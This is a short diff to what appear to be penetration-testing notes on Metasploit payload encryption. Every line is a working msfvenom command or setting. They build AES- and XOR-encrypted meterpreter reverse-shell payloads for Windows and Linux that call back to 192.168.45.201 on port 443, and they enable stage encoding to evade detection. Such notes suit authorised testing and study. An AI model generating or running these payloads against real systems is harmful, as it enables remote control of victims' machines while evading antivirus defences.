@@ -23,4 +23,7 @@ Encryptors
 ```
 msfvenom --list encrypt
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 --encrypt xor -e x86/xor_dynamic -f elf -o met.elf
+    set EnableStageEncoding true
+    set StageEncoder xor 
 ```
